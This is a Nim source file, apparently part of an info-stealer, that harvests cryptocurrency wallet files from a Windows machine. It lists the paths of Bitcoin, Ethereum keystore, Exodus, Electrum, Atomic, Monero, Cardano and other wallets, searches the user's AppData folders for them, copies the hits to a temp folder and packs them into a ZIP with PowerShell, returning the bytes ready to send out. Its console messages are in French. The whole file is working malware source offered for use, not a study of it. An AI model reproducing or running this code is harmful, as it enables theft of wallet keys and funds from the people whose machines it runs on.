import os, strutils

const
  BitcoinPath = "\\Bitcoin\\wallet.dat"
  BitcoinCorePath = "\\Bitcoin\\wallets\\wallet.dat"
  EthereumPath = "\\Ethereum\\keystore"
  GethPath = "\\Ethereum\\geth\\keystore"
  ExodusPath = "\\Exodus\\exodus.wallet"
  ElectrumPath = "\\Electrum\\wallets"
  AtomicPath = "\\atomic\\Local Storage"
  BinancePath = "\\Binance\\app-store"
  MoneroPath = "\\Monero\\wallet"

const
  OtherWallets = [
    "\\Zcash\\params",
    "\\Litecoin\\wallet.dat",
    "\\Dogecoin\\wallet.dat",
    "\\DashCore\\wallet.dat",
    "\\Ripple\\ripple.txt",
    "\\Cardano\\secret.key"
  ]

proc getAppData*(): string =
  result = getEnv("APPDATA")
  if result == "":
    result = getEnv("USERPROFILE") & "\\AppData\\Roaming"

proc getLocalAppData*(): string =
  result = getEnv("LOCALAPPDATA")
  if result == "":
    result = getEnv("USERPROFILE") & "\\AppData\\Local"

proc findWallets*(): seq[string] =
  result = @[]
  
  let appdata = getAppData()
  let localappdata = getLocalAppData()
  
  for path in [BitcoinPath, BitcoinCorePath]:
    let fullPath = appdata & path
    if fileExists(fullPath):
      result.add(fullPath)
  
  for path in [EthereumPath, GethPath]:
    let fullPath = appdata & path
    if dirExists(fullPath):
      for file in walkFiles(fullPath & "\\*"):
        result.add(file)
  
  let exodusPath = appdata & ExodusPath
  if fileExists(exodusPath):
    result.add(exodusPath)
  
  let electrumPath = appdata & ElectrumPath
  if dirExists(electrumPath):
    for file in walkFiles(electrumPath & "\\*"):
      result.add(file)
  
  let atomicPath = localappdata & AtomicPath
  if dirExists(atomicPath):
    for file in walkFiles(atomicPath & "\\*"):
      if file.endsWith(".log") or file.endsWith(".ldb"):
        result.add(file)
  
  for path in OtherWallets:
    let fullPath = appdata & path
    if fileExists(fullPath):
      result.add(fullPath)
    elif dirExists(fullPath):
      for file in walkFiles(fullPath & "\\*"):
        result.add(file)

proc extractAndZipWallets*(): string =
  let wallets = findWallets()
  
  if wallets.len == 0:
    return ""
  
  let tempDir = getTempDir() & "wallets_" & $getCurrentProcessId()
  createDir(tempDir)
  
  for wallet in wallets:
    let dest = tempDir / extractFilename(wallet)
    copyFile(wallet, dest)
  
  let zipFile = getTempDir() & "wallets_data.zip"
  discard execShellCmd("powershell -c \"Compress-Archive -Path '" & tempDir & "\\*' -DestinationPath '" & zipFile & "' -Force\"")
  
  var result = ""
  if fileExists(zipFile):
    result = readFile(zipFile)
  
  return result

when isMainModule:
  let data = extractAndZipWallets()
  if data != "":
    echo "[+] Wallets extraits: ", data.len, " bytes"
    echo "[+] Dossier: ", getTempDir() & "wallets_" & $getCurrentProcessId()
    echo "[+] ZIP: ", getTempDir() & "wallets_data.zip"
  else:
    echo "[-] Aucun wallet trouvé"